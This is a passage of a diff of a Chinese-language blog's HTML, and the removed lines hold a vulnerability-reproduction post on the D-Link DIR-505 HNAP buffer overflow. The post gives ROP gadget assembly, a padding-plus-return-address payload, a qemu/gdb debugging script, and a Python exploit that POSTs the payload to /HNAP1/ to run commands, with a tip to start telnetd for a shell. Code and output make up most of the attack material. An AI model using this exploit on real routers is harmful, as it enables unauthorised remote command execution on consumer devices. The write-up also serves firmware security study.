&#x27;deadbeef&#x27;&quot;</span>`</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$STDIN</span>&quot;</span> | <span class="built_in">chroot</span> . ./qemu-mips-static -g 12345 ./usr/bin/my_cgi.cgi</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-2023-0412-181411810.png" alt="undifined"></p>
-<p>路由器上的程序安全措施通常非常简单，没有 NX 也没有 PIE，此处就直接使用 ret2syscall 来达到命令执行的操作，在 IDA 中使用 mipsrop 插件搜索合适的 gadget，决定使用 0x00405C5C 处。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:00405C5C la      $t9, system</span><br><span class="line">.text:00405C60 li      $s1, loc_430000</span><br><span class="line">.text:00405C64 jalr    $t9 ; system</span><br><span class="line">.text:00405C68 addiu   $a0, $sp, 0x64+var_3C  # command</span><br></pre></td></tr></table></figure>
-
-<p>当劫持了控制流执行到 gadget，堆栈已经从 do_hnap 函数中恢复了平衡，通过计算，system 函数执行的命令保存在相对于 buf 30064 个字节处，总结就是：buf 写入 30020 个字节之后可以覆盖返回地址到 gadget 0x00405c5c，再写入 40 个字节可以写入 system 函数执行的命令，那么先用 python 脚本写入一个 stdin 文件，然后在调试脚本中通过 cat 输出文件内容，通过管道传递给 qemu</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python poc.py</span></span><br><span class="line">cmd = <span class="string">b&#x27;touch test\x00&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./stdin&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    poc = <span class="number">30020</span> * <span class="string">b&#x27;A&#x27;</span> + <span class="string">b&#x27;\x00\x40\x5c\x5c&#x27;</span> + <span class="number">40</span> * <span class="string">b&#x27;B&#x27;</span> + cmd</span><br><span class="line">    f.write(poc)</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">sudo ./debug_mycgi.sh</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">export SCRIPT_NAME=&quot;HNAP1&quot;</span><br><span class="line">export SOAP_ACTION=&quot;soap&quot;</span><br><span class="line">export CONTENT_LENGTH=&quot;30080&quot;</span><br><span class="line"></span><br><span class="line">cat ./stdin | chroot . ./qemu-mips-static -g 12345 ./usr/bin/my_cgi.cgi</span><br></pre></td></tr></table></figure>
-
-<p>使用 gdb-multiarch 连接上 target remote :12345，然后在 do_hnap 函数恢复返回地址到 ra 寄存器处下断点 <code>b *0x431168</code>，可以看到执行完当前指令后，ra 被写入为 gadget 地址 0x405c5c<br><img src="/images/image-2023-0412-181437533.png" alt="undifined"><br>继续单步调试到执行 gadget，调用 system 函数，执行的命令保存在 sp + 0x28 处。<br><img src="/images/image-2023-0412-181459541.png" alt="undifined"><br>可以看到成功命令执行，创建了 test 文件<br><img src="/images/image-2023-0412-181517479.png" alt="undifined"></p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>如上的漏洞复现调试是针对与 my_cgi.cgi，而真实运行环境是通过 lighttpd 服务器接受用户发送请求数据包，然后将数据通过环境变量以及 STDIN 传递给 my_cgi.cgi 进行处理，漏洞发生也是在这个地方，那么漏洞利用需要构造数据包向 lighttpd 传递。初次之外，还需要看固件支持哪些命令，例如此处的 busybox 支持的命令如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">BusyBox v1.01 (2013.05.23-09:13+0000) multi-call binary</span><br><span class="line"></span><br><span class="line">Usage: busybox [function] [arguments]...</span><br><span class="line">   or: [function] [arguments]...</span><br><span class="line"></span><br><span class="line">        BusyBox is a multi-call binary that combines many common Unix</span><br><span class="line">        utilities into a single executable.  Most people will create a</span><br><span class="line">        link to busybox for each function they wish to use and BusyBox</span><br><span class="line">        will act like whatever it was invoked as!</span><br><span class="line"></span><br><span class="line">Currently defined functions:</span><br><span class="line">        [, arping, ash, brctl, busybox, cat, chmod, cp, cut, date, dd,</span><br><span class="line">        df, dirname, du, echo, egrep, fdisk, fgrep, find, free, grep,</span><br><span class="line">        head, hostname, ifconfig, init, insmod, kill, killall, klogd,</span><br><span class="line">        linuxrc, ln, logger, login, logread, ls, lsmod, md5sum, mkdir,</span><br><span class="line">        mount, mv, nslookup, ping, ps, reboot, rm, rmmod, route, sed,</span><br><span class="line">        sh, sleep, syslogd, tar, telnetd, test, tftp, touch, tr, tty,</span><br><span class="line">        umount, uname, vconfig, vi, wc, wget, xargs, zcip</span><br></pre></td></tr></table></figure>
-
-<p>那么简洁版的 exp 如下，执行结果是直接写回了到返回数据包中。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">cmd = <span class="string">b&#x27;ls -l\x00&#x27;</span></span><br><span class="line">poc = <span class="number">30020</span> * <span class="string">b&#x27;A&#x27;</span> + <span class="string">b&#x27;\x00\x40\x5c\x5c&#x27;</span> + <span class="number">40</span> * <span class="string">b&#x27;B&#x27;</span> + cmd</span><br><span class="line">res = requests.post(url=<span class="string">&#x27;http://127.0.0.1:80/HNAP1/&#x27;</span>, data=poc)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
-<p><img src="/images/image-2023-0412-181608350.png" alt="undifined"><br>通过 busybox 支持的命令也可以看到，有 telnetd，如果在实体机上要获取到一个可交互的 shell，那么可以开启设备的 telnet 服务。</p>
-<h2 id="个人小结"><a href="#个人小结" class="headerlink" title="个人小结"></a>个人小结</h2><p>如下是个人觉得可以加深对于程序执行流程理解的一些点：</p>
-<ul>
-<li><p>do_hnap 函数中循环的控制及 MIPS 架构 s 系列寄存器的用法<br>寄存器 <code>s0~s7</code> 通常是用来在子函数内部使用，如果在子函数内部还需要调用函数，那么需要将这些寄存器的值保存在栈上，执行完调用函数后进行恢复。例如<code>s0~s7</code> 在 main 函数中使用，当 main 函数调用 do_hnap 的时候，在 do_hnap 函数的初始化堆栈时，将寄存器保存到了栈上。因此，我们在缓冲区溢出的时候，有时候不止可以控制 ra 寄存器，还可以控制 s 系列寄存器。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># do_hnap 函数初始化过程</span><br><span class="line">.text:00430DAC li      $gp, (_GLOBAL_OFFSET_TABLE_+0x7FF0 - .)</span><br><span class="line">.text:00430DB4 addu    $gp, $t9</span><br><span class="line">.text:00430DB8 addiu   $sp, -0x7578</span><br><span class="line">.text:00430DBC sw      $ra, 0x7560+var_s14($sp)</span><br><span class="line">.text:00430DC0 sw      $s4, 0x7560+var_s10($sp)</span><br><span class="line">.text:00430DC4 sw      $s3, 0x7560+var_sC($sp)</span><br><span class="line">.text:00430DC8 sw      $s2, 0x7560+var_s8($sp)</span><br><span class="line">.text:00430DCC sw      $s1, 0x7560+var_s4($sp)</span><br><span class="line">.text:00430DD0 sw      $s0, 0x7560+var_s0($sp)</span><br><span class="line">...</span><br><span class="line"># do_hnap 函数执行完毕 </span><br><span class="line">.text:00431168 lw      $ra, 0x7574($sp)</span><br><span class="line">.text:0043116C move    $v0, $s0</span><br><span class="line">.text:00431170 lw      $s4, 0x7570($sp)</span><br><span class="line">.text:00431174 lw      $s3, 0x756C($sp)</span><br><span class="line">.text:00431178 lw      $s2, 0x7568($sp)</span><br><span class="line">.text:0043117C lw      $s1, 0x7564($sp)</span><br><span class="line">.text:00431180 lw      $s0, 0x7560($sp)</span><br><span class="line">.text:00431184 jr      $ra</span><br><span class="line">.text:00431188 addiu   $sp, 0x7578</span><br></pre></td></tr></table></figure>
-<p>那么现在回归正题，do_hnap 函数是使用的 s0 指向 buf 的起始地址，s1 指向 buf 的结束位置，s3 指向标准输入的起始地址。循环的结构使用 IDA 的控制流图看的话，就非常简介明了。s0 先指向 buf 起始地址，每次调用 fgetc 读取一个字符保存到 s0，然后 s0 自加指向下一个位置，直到 s0 指向结束地址。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:00430F9C la      $s3, stdin       # 标准输入存储在 s3 寄存器</span><br><span class="line">.text:00430FA0 move    $s0, $a0			# s0：指针指向 buf 的起始位置</span><br><span class="line">.text:00430FA4 addu    $s1, $a0, $s1    # s1：指针指向 buf 的结束位置</span><br><span class="line">...</span><br><span class="line">.text:00431010 sb      $v0, 0($s0)		# 将从 fgetc 读取到的字符存储到缓冲区</span><br><span class="line">.text:00431014 addiu   $s0, 1           # s0 移动到缓冲区下一个位置</span><br><span class="line">.text:00431018 bne     $s0, $s1, loc_430FB4	# 比较进行跳转</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>关于 server 的启动命令分析<br>可以分析固件文件系统的初始化启动脚本，通常在 &#x2F;etc&#x2F;rc* 文件或者目录下，就可以得到设备启动时执行了哪些初始化工作，例如挂载设备、创建文件等等。此处还有解压 html 文件，应该为了节省设备的存储空间，第一次启动的时候进行解压。</p>
-</li>
-<li><p>关于漏洞利用执行结果回显<br>如果设备固件中带有一些可以进行交互的程序例如 sshd、telnetd 等服务，那么命令执行可以通过这些程序直接获取到一个可交互的 shell，如果没有，可以考虑把执行结果写回到设备的 www 目录中的文件，通过 http 服务访问命令执行结果。</p>
-</li>
-</ul>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
-<li><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/34064">[exploit.db] D-Link HNAP - Request Remote Buffer Overflow (Metasploit)</a></li>
-<li><a target="_blank" rel="noopener" href="http://en.hackdig.com/?739.htm">Hacking the D-Link DSP-W215 Smart Plug</a></li>
-<li><a target="_blank" rel="noopener" href="http://legacyfiles.us.dlink.com/DIR-505/REVA/FIRMWARE/DIR-505_REVA_FIRMWARE_1.07.ZIP">[固件下载] DIR-505_REVA_FIRMWARE_1.07.ZIP</a>]</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1518,7 +1602,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">43</span>
+          <span class="site-state-item-count">44</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
